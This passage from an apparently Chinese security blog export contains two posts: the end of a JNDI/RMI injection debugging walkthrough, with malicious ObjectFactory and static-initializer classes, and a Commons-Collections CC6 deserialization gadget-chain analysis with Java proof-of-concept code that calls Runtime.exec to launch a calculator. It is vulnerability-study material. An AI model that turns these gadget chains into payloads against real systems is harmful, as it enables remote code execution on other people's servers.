<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
                      class="" title="image-20250311111345871"
                > 

<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
                      class="" title="image-20250311111457239"
                > 

<p>所以可以先在代码层面配置一下</p>
<p>把客户端注释删掉</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
                      class="" title="image-20250311111521783"
                > 

<p> 再次运行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
                      class="" title="image-20250311111556400"
                >

<p>实现命令执行</p>
<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
                      class="" title="image-20250311112142514"
                > 

<p>跟进initialContext.lookup</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
                      class="" title="image-20250311112322450"
                >

<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
                      class="" title="image-20250311112621799"
                >

<p>回到上面的lookup跟进</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
                      class="" title="image-20250311113252823"
                >

<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
                      class="" title="image-20250311113439043"
                >

<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
                      class="" title="image-20250311113517988"
                >

<p>跟进这里的lookup，漏洞触发的地方</p>
<p>先看var2.getRemainingName() 会返回的是什么参数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
                      class="" title="image-20250311113727742"
                >

<p>就只是返回remote，我们注册表的名字</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
                      class="" title="image-20250311113816366"
                >

<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
                      class="" title="image-20250311113905487"
                > 

<p>这里传入的也是remote</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
                      class="" title="image-20250311113938872"
                > 

<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
                      class="" title="image-20250311114259827"
                > 

<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
                      class="" title="image-20250311114349568"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
                      class="" title="image-20250311114558379"
                > 

<p>然后将我们的恶意类对象给实例化</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
                      class="" title="image-20250311114639838"
                > 

<p>跟进函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
                      class="" title="image-20250311114944263"
                > 发现builder为null，所以不会进入这个if

<p>将恶意类名称赋值给了ref</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
                      class="" title="image-20250311115057408"
                > 

<p>获取对象的实例</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
                      class="" title="image-20250311120004969"
                >

<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
                      class="" title="image-20250311120021055"
                > 

<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
                      class="" title="image-20250311125258505"
                >

<p>成功造成命令执行</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
                      class="" title="image-20250311130215787"
                > 

<p>这里有个if判断，codebase为null所以不会进去</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
                      class="" title="image-20250311130605217"
                > 

<p>最后会走到对我们恶意类的实例化</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
                      class="" title="image-20250311130335797"
                >

<p>然后实例化调用了静态方法造成RCE</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
                      class="" title="image-20250311130639541"
                > 

]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>CC6反序列化链</title>
    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    <content><![CDATA[<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
                      class=""
                > 

<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
<p>然后用的是lazymap这条链子</p>
<ul>
<li><p>利用的依赖</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
                      class="" title="img"
                > 

<p>我们查看InvokerTransformer这个类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
                      class="" title="img"
                > 

<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
                      class="" title="img"
                > 

<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
                      class="" title="img"
                > 

<p>我们查看下LazyMap的decorate函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
                      class="" title="img"
                > 

<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
                      class=""
                > 

<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
                      class="" title="img"
                > 

<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
                      class="" title="img"
                > 

<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
<p>某某函数-&gt;LazyMap.get()</p>
<p>依据ysoSerial链子找到了TiedMapEntry</p>
<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
                      class="" title="img"
                > 

<p>看到他的getValue函数，他是map.get(key)</p>
<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
<p>然后LazyMap调用get是不是就是上面的</p>
<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
<p>那如果key可控为Runtime.class呢</p>
<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
<p>就实现RCE了</p>
<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
                      class="" title="img"
                > 

<p>可以看出他可以序列化这个TiedMapEntry</p>
<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
                      class="" title="img"
                > 

<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>真的很简单写下来就会发现</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
                      class="" title="img"
                > 

<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
                      class="" title="img"
                > 

<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
<p>也写一下代码吧</p>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
                      class="" title="img"
                >

<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
<p>其实这里也可以想想入口怎么样很完美了</p>
<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
                      class="" title="img"
                >

<p>可以序列化和反序列化</p>
<p>这里其实跟URL利用hashmap反序列化连起来了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
                      class="" title="img"
                >

<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
                      class="" title="img"
                >

<p>直接就看到hashCode</p>
<p>并且key.hashCode()，key还可控啊</p>
<p>我们观察下他的反序列化readObject</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
                      class="" title="img"
                > 

<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
</li>
<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
</li>
<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
                      class="" title="img"
                > 

<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
                      class="" title="img"
                > 

<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
                      class="" title="img"
                > 

<p>然后debug会调用toString</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
                      class="" title="img"
                > 

<p>toString调用getValue</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
                      class="" title="img"
                > 

<p>map是我们传入的LazyMap对象</p>
<p>后一步是LazyMap的get(key)函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
                      class="" title="img"
                > 

<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
                      class="" title="img"
                > 

<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
<img  
                     lazyload
